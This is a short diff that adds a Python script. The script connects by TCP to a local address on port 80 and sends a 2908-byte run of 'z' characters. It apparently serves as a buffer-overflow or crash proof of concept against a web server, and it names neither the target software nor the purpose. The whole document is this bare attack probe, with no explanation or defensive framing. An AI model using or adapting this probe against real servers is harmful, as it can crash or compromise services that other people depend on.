@@ -1,0 +1,10 @@
+  from socket import socket, AF_INET, SOCK_STREAM
+
+  host = "192.168.1.12"
+  port = 80
+
+  s = socket(AF_INET, SOCK_STREAM)
+  s.connect((host, port))
+  s.send('z' * 2908 + '\n\n')
+  s.recv(1024)
+  s.close()
